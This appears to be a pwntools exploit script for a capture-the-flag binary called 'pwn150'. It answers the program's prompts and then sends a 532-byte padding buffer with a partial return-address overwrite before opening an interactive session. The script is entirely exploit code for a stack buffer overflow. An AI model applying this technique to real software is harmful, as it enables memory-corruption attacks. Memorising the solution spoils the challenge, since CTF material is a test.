# coding: utf-8
from pwn import *

p = process('./pwn150')
p.recv()
p.sendline('A')
p.recv()
p.sendline('Y')
p.recv()
p.sendline('55000')
p.recv()
p.sendline('A'*532+chr(0xd8)+chr(0x04)+chr(0x01))
p.interactive()
